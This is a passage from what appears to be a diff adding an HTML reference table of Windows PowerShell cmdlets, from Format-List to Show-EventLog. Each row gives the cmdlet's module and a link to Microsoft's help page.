+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113301">help</a></td>
+</tr>
+<tr>
+<td>Format-List</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113302">help</a></td>
+</tr>
+<tr>
+<td>Format-Table</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113303">help</a></td>
+</tr>
+<tr>
+<td>Format-Wide</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113304">help</a></td>
+</tr>
+<tr>
+<td>Get-Acl</td>
+<td>Microsoft.PowerShell.Security</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113305">help</a></td>
+</tr>
+<tr>
+<td>Get-Alias</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113306">help</a></td>
+</tr>
+<tr>
+<td>Get-AuthenticodeSignature</td>
+<td>Microsoft.PowerShell.Security</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113307">help</a></td>
+</tr>
+<tr>
+<td>Get-ChildItem</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113308">help</a></td>
+</tr>
+<tr>
+<td>Get-Command</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113309">help</a></td>
+</tr>
+<tr>
+<td>Get-ComputerRestorePoint</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135215">help</a></td>
+</tr>
+<tr>
+<td>Get-Content</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113310">help</a></td>
+</tr>
+<tr>
+<td>Get-Counter</td>
+<td>Microsoft.PowerShell.Diagnostics</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=138335">help</a></td>
+</tr>
+<tr>
+<td>Get-Credential</td>
+<td>Microsoft.PowerShell.Security</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113311">help</a></td>
+</tr>
+<tr>
+<td>Get-Culture</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113312">help</a></td>
+</tr>
+<tr>
+<td>Get-Date</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113313">help</a></td>
+</tr>
+<tr>
+<td>Get-Event</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113453">help</a></td>
+</tr>
+<tr>
+<td>Get-EventLog</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113314">help</a></td>
+</tr>
+<tr>
+<td>Get-EventSubscriber</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135155">help</a></td>
+</tr>
+<tr>
+<td>Get-ExecutionPolicy</td>
+<td>Microsoft.PowerShell.Security</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113315">help</a></td>
+</tr>
+<tr>
+<td>Get-FormatData</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=144303">help</a></td>
+</tr>
+<tr>
+<td>Get-Help</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113316">help</a></td>
+</tr>
+<tr>
+<td>Get-History</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113317">help</a></td>
+</tr>
+<tr>
+<td>Get-Host</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113318">help</a></td>
+</tr>
+<tr>
+<td>Get-HotFix</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135217">help</a></td>
+</tr>
+<tr>
+<td>Get-Item</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113319">help</a></td>
+</tr>
+<tr>
+<td>Get-ItemProperty</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113320">help</a></td>
+</tr>
+<tr>
+<td>Get-Job</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113328">help</a></td>
+</tr>
+<tr>
+<td>Get-Location</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113321">help</a></td>
+</tr>
+<tr>
+<td>Get-Member</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113322">help</a></td>
+</tr>
+<tr>
+<td>Get-Module</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=141552">help</a></td>
+</tr>
+<tr>
+<td>Get-PfxCertificate</td>
+<td>Microsoft.PowerShell.Security</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113323">help</a></td>
+</tr>
+<tr>
+<td>Get-Process</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113324">help</a></td>
+</tr>
+<tr>
+<td>Get-PSBreakpoint</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113325">help</a></td>
+</tr>
+<tr>
+<td>Get-PSCallStack</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113326">help</a></td>
+</tr>
+<tr>
+<td>Get-PSDrive</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113327">help</a></td>
+</tr>
+<tr>
+<td>Get-PSProvider</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113329">help</a></td>
+</tr>
+<tr>
+<td>Get-PSSession</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135219">help</a></td>
+</tr>
+<tr>
+<td>Get-PSSessionConfiguration</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=144304">help</a></td>
+</tr>
+<tr>
+<td>Get-PSSnapin</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113330">help</a></td>
+</tr>
+<tr>
+<td>Get-Random</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113446">help</a></td>
+</tr>
+<tr>
+<td>Get-Service</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113332">help</a></td>
+</tr>
+<tr>
+<td>Get-TraceSource</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113333">help</a></td>
+</tr>
+<tr>
+<td>Get-Transaction</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135220">help</a></td>
+</tr>
+<tr>
+<td>Get-UICulture</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113334">help</a></td>
+</tr>
+<tr>
+<td>Get-Unique</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113335">help</a></td>
+</tr>
+<tr>
+<td>Get-Variable</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113336">help</a></td>
+</tr>
+<tr>
+<td>Get-WinEvent</td>
+<td>Microsoft.PowerShell.Diagnostics</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=138336">help</a></td>
+</tr>
+<tr>
+<td>Get-WmiObject</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113337">help</a></td>
+</tr>
+<tr>
+<td>Get-WSManCredSSP</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141443">help</a></td>
+</tr>
+<tr>
+<td>Get-WSManInstance</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141444">help</a></td>
+</tr>
+<tr>
+<td>Group-Object</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113338">help</a></td>
+</tr>
+<tr>
+<td>Import-Alias</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113339">help</a></td>
+</tr>
+<tr>
+<td>Import-Clixml</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113340">help</a></td>
+</tr>
+<tr>
+<td>Import-Counter</td>
+<td>Microsoft.PowerShell.Diagnostics</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=138338">help</a></td>
+</tr>
+<tr>
+<td>Import-Csv</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113341">help</a></td>
+</tr>
+<tr>
+<td>Import-LocalizedData</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113342">help</a></td>
+</tr>
+<tr>
+<td>Import-Module</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=141553">help</a></td>
+</tr>
+<tr>
+<td>Import-PSSession</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135221">help</a></td>
+</tr>
+<tr>
+<td>Invoke-Command</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135225">help</a></td>
+</tr>
+<tr>
+<td>Invoke-Expression</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113343">help</a></td>
+</tr>
+<tr>
+<td>Invoke-History</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113344">help</a></td>
+</tr>
+<tr>
+<td>Invoke-Item</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113345">help</a></td>
+</tr>
+<tr>
+<td>Invoke-WmiMethod</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113346">help</a></td>
+</tr>
+<tr>
+<td>Invoke-WSManAction</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141446">help</a></td>
+</tr>
+<tr>
+<td>Join-Path</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113347">help</a></td>
+</tr>
+<tr>
+<td>Limit-EventLog</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135227">help</a></td>
+</tr>
+<tr>
+<td>Measure-Command</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113348">help</a></td>
+</tr>
+<tr>
+<td>Measure-Object</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113349">help</a></td>
+</tr>
+<tr>
+<td>Move-Item</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113350">help</a></td>
+</tr>
+<tr>
+<td>Move-ItemProperty</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113351">help</a></td>
+</tr>
+<tr>
+<td>New-Alias</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113352">help</a></td>
+</tr>
+<tr>
+<td>New-Event</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135234">help</a></td>
+</tr>
+<tr>
+<td>New-EventLog</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135235">help</a></td>
+</tr>
+<tr>
+<td>New-Item</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113353">help</a></td>
+</tr>
+<tr>
+<td>New-ItemProperty</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113354">help</a></td>
+</tr>
+<tr>
+<td>New-Module</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=141554">help</a></td>
+</tr>
+<tr>
+<td>New-ModuleManifest</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=141555">help</a></td>
+</tr>
+<tr>
+<td>New-Object</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113355">help</a></td>
+</tr>
+<tr>
+<td>New-PSDrive</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113357">help</a></td>
+</tr>
+<tr>
+<td>New-PSSession</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135237">help</a></td>
+</tr>
+<tr>
+<td>New-PSSessionOption</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=144305">help</a></td>
+</tr>
+<tr>
+<td>New-Service</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113359">help</a></td>
+</tr>
+<tr>
+<td>New-TimeSpan</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113360">help</a></td>
+</tr>
+<tr>
+<td>New-Variable</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113361">help</a></td>
+</tr>
+<tr>
+<td>New-WebServiceProxy</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135238">help</a></td>
+</tr>
+<tr>
+<td>New-WSManInstance</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141448">help</a></td>
+</tr>
+<tr>
+<td>New-WSManSessionOption</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141449">help</a></td>
+</tr>
+<tr>
+<td>Out-Default</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113362">help</a></td>
+</tr>
+<tr>
+<td>Out-File</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113363">help</a></td>
+</tr>
+<tr>
+<td>Out-GridView</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113364">help</a></td>
+</tr>
+<tr>
+<td>Out-Host</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113365">help</a></td>
+</tr>
+<tr>
+<td>Out-Null</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113366">help</a></td>
+</tr>
+<tr>
+<td>Out-Printer</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113367">help</a></td>
+</tr>
+<tr>
+<td>Out-String</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113368">help</a></td>
+</tr>
+<tr>
+<td>Pop-Location</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113369">help</a></td>
+</tr>
+<tr>
+<td>Push-Location</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113370">help</a></td>
+</tr>
+<tr>
+<td>Read-Host</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113371">help</a></td>
+</tr>
+<tr>
+<td>Receive-Job</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113372">help</a></td>
+</tr>
+<tr>
+<td>Register-EngineEvent</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135243">help</a></td>
+</tr>
+<tr>
+<td>Register-ObjectEvent</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135244">help</a></td>
+</tr>
+<tr>
+<td>Register-PSSessionConfiguration</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=144306">help</a></td>
+</tr>
+<tr>
+<td>Register-WmiEvent</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135245">help</a></td>
+</tr>
+<tr>
+<td>Remove-Computer</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135246">help</a></td>
+</tr>
+<tr>
+<td>Remove-Event</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135247">help</a></td>
+</tr>
+<tr>
+<td>Remove-EventLog</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135248">help</a></td>
+</tr>
+<tr>
+<td>Remove-Item</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113373">help</a></td>
+</tr>
+<tr>
+<td>Remove-ItemProperty</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113374">help</a></td>
+</tr>
+<tr>
+<td>Remove-Job</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113377">help</a></td>
+</tr>
+<tr>
+<td>Remove-Module</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=141556">help</a></td>
+</tr>
+<tr>
+<td>Remove-PSBreakpoint</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113375">help</a></td>
+</tr>
+<tr>
+<td>Remove-PSDrive</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113376">help</a></td>
+</tr>
+<tr>
+<td>Remove-PSSession</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135250">help</a></td>
+</tr>
+<tr>
+<td>Remove-PSSnapin</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113378">help</a></td>
+</tr>
+<tr>
+<td>Remove-Variable</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113380">help</a></td>
+</tr>
+<tr>
+<td>Remove-WmiObject</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113381">help</a></td>
+</tr>
+<tr>
+<td>Remove-WSManInstance</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141453">help</a></td>
+</tr>
+<tr>
+<td>Rename-Item</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113382">help</a></td>
+</tr>
+<tr>
+<td>Rename-ItemProperty</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113383">help</a></td>
+</tr>
+<tr>
+<td>Reset-ComputerMachinePassword</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135252">help</a></td>
+</tr>
+<tr>
+<td>Resolve-Path</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113384">help</a></td>
+</tr>
+<tr>
+<td>Restart-Computer</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135253">help</a></td>
+</tr>
+<tr>
+<td>Restart-Service</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113385">help</a></td>
+</tr>
+<tr>
+<td>Restore-Computer</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135254">help</a></td>
+</tr>
+<tr>
+<td>Resume-Service</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113386">help</a></td>
+</tr>
+<tr>
+<td>Select-Object</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113387">help</a></td>
+</tr>
+<tr>
+<td>Select-String</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113388">help</a></td>
+</tr>
+<tr>
+<td>Select-Xml</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135255">help</a></td>
+</tr>
+<tr>
+<td>Send-MailMessage</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135256">help</a></td>
+</tr>
+<tr>
+<td>Set-Acl</td>
+<td>Microsoft.PowerShell.Security</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113389">help</a></td>
+</tr>
+<tr>
+<td>Set-Alias</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113390">help</a></td>
+</tr>
+<tr>
+<td>Set-AuthenticodeSignature</td>
+<td>Microsoft.PowerShell.Security</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113391">help</a></td>
+</tr>
+<tr>
+<td>Set-Content</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113392">help</a></td>
+</tr>
+<tr>
+<td>Set-Date</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113393">help</a></td>
+</tr>
+<tr>
+<td>Set-ExecutionPolicy</td>
+<td>Microsoft.PowerShell.Security</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113394">help</a></td>
+</tr>
+<tr>
+<td>Set-Item</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113395">help</a></td>
+</tr>
+<tr>
+<td>Set-ItemProperty</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113396">help</a></td>
+</tr>
+<tr>
+<td>Set-Location</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113397">help</a></td>
+</tr>
+<tr>
+<td>Set-PSBreakpoint</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113449">help</a></td>
+</tr>
+<tr>
+<td>Set-PSDebug</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113398">help</a></td>
+</tr>
+<tr>
+<td>Set-PSSessionConfiguration</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=144307">help</a></td>
+</tr>
+<tr>
+<td>Set-Service</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113399">help</a></td>
+</tr>
+<tr>
+<td>Set-StrictMode</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113450">help</a></td>
+</tr>
+<tr>
+<td>Set-TraceSource</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113400">help</a></td>
+</tr>
+<tr>
+<td>Set-Variable</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113401">help</a></td>
+</tr>
+<tr>
+<td>Set-WmiInstance</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113402">help</a></td>
+</tr>
+<tr>
+<td>Set-WSManInstance</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141458">help</a></td>
+</tr>
+<tr>
+<td>Set-WSManQuickConfig</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=141463">help</a></td>
+</tr>
+<tr>
+<td>Show-EventLog</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135257">help</a></td>
+</tr>
+<tr>
